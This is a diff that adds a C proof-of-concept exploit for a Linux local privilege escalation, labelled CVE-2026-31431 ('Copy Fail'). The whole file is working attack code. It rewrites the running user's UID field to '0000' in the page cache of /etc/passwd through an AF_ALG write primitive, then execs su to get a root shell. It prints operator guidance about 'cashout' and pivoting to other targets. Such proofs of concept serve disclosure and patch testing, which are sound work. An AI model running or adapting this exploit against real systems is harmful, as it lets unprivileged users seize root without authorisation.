@@ -1,0 +1,134 @@
+/* SPDX-License-Identifier: LGPL-2.1-or-later OR MIT */
+/*
+ * Copy Fail -- CVE-2026-31431 -- /etc/passwd UID-flip variant.
+ *
+ * Mutates /etc/passwd's page cache to set the running user's UID field
+ * to "0000", then execs `su <user>`. PAM authenticates against
+ * /etc/shadow (untouched) using the user's real password; on success,
+ * su's setuid() reads the corrupted /etc/passwd from the page cache and
+ * lands in a root shell.
+ *
+ * Compared to exploit.c (the binary-mutation variant), this works on
+ * any system where /etc/passwd is world-readable (every standard Linux
+ * system) including environments that harden setuid binaries against
+ * unprivileged read access.
+ *
+ * Constraint: only works for users whose UID is exactly four ASCII
+ * digits (1000-9999), since the AF_ALG primitive writes exactly four
+ * bytes at a time. UIDs of other widths would require either a
+ * different mutation pattern or multi-write coordination.
+ */
+
+#define _GNU_SOURCE
+#include <errno.h>
+#include <fcntl.h>
+#include <pwd.h>
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+#include <sys/types.h>
+
+#include "utils.h"
+
+/* Find the byte offset of the UID field for `username` in /etc/passwd.
+ * Returns -1 on error or if the user is not found. */
+static off_t find_uid_offset(const char *username) {
+        int fd = open("/etc/passwd", O_RDONLY);
+        if (fd < 0) { perror("open(/etc/passwd)"); return -1; }
+
+        char buf[65536];
+        ssize_t n = read(fd, buf, sizeof buf - 1);
+        close(fd);
+        if (n <= 0) { perror("read(/etc/passwd)"); return -1; }
+        buf[n] = '\0';
+
+        size_t namelen = strlen(username);
+        char *line = buf;
+        while (line < buf + n) {
+                char *eol = memchr(line, '\n', (buf + n) - line);
+                size_t linelen = eol ? (size_t)(eol - line) : (size_t)((buf + n) - line);
+
+                if (linelen > namelen + 1 &&
+                memcmp(line, username, namelen) == 0 &&
+                line[namelen] == ':') {
+                /* line: name:x:UID:GID:gecos:home:shell */
+                char *colon1 = memchr(line,            ':', linelen);
+                if (!colon1) break;
+                char *colon2 = memchr(colon1 + 1, ':', linelen - (size_t)(colon1 + 1 - line));
+                if (!colon2) break;
+                return (off_t)((colon2 + 1) - buf);
+                }
+                if (!eol) break;
+                line = eol + 1;
+        }
+
+        fprintf(stderr, "[-] could not find user %s in /etc/passwd\n", username);
+        return -1;
+}
+
+int main(void) {
+        uid_t uid = getuid();
+        struct passwd *pw = getpwuid(uid);
+        if (!pw) { perror("getpwuid"); return 1; }
+
+        if (uid < 1000 || uid > 9999) {
+                fprintf(stderr,
+                        "[-] this variant requires a 4-digit UID (got %u for %s).\n",
+                        uid, pw->pw_name);
+                return 1;
+        }
+
+        fprintf(stderr, "[+] user:    %s (uid=%u)\n", pw->pw_name, uid);
+
+        off_t uid_offset = find_uid_offset(pw->pw_name);
+        if (uid_offset < 0) return 1;
+        fprintf(stderr, "[+] /etc/passwd UID field at offset %lld\n",
+                (long long)uid_offset);
+
+        /* Sanity-check: the four bytes we're about to overwrite should be the
+        * ASCII representation of `uid`. If not, our offset math is wrong and
+        * we'd corrupt something else. */
+        char expected[5];
+        snprintf(expected, sizeof expected, "%04u", uid);
+
+        int fd = open("/etc/passwd", O_RDONLY);
+        if (fd < 0) { perror("open(/etc/passwd)"); return 1; }
+        char readback[5] = { 0 };
+        if (pread(fd, readback, 4, uid_offset) != 4) {
+                perror("pread"); close(fd); return 1;
+        }
+        if (memcmp(readback, expected, 4) != 0) {
+                fprintf(stderr,
+                        "[-] sanity check failed: expected %.4s at offset %lld, "
+                        "found %.4s\n",
+                        expected, (long long)uid_offset, readback);
+                close(fd); return 1;
+        }
+        fprintf(stderr, "[+] sanity check ok: bytes at offset are \"%.4s\"\n",
+                readback);
+
+        if (patch_chunk(fd, uid_offset, (const unsigned char *)"0000") < 0) {
+                fprintf(stderr, "[-] page-cache mutation failed\n");
+                close(fd); return 1;
+        }
+        close(fd);
+
+        fprintf(stderr,
+                "[+] /etc/passwd page cache mutated; %s's UID is now 0000\n",
+                pw->pw_name);
+        fprintf(stderr,
+                "[+] attempting cashout via `su %s`\n", pw->pw_name);
+        fprintf(stderr,
+                "[!] If su fails with \"Cannot determine your user name\"\n"
+                "    (shadow-utils' caller-identity check), the page cache\n"
+                "    mutation is still active. Pivot to another cashout\n"
+                "    that consults /etc/passwd.\n");
+        fprintf(stderr,
+                "[+] cleanup after testing (run as root):\n"
+                "    echo 3 > /proc/sys/vm/drop_caches\n\n");
+
+        execlp("su", "su", pw->pw_name, (char *)NULL);
+        perror("execlp(su)");
+        return 1;
+}
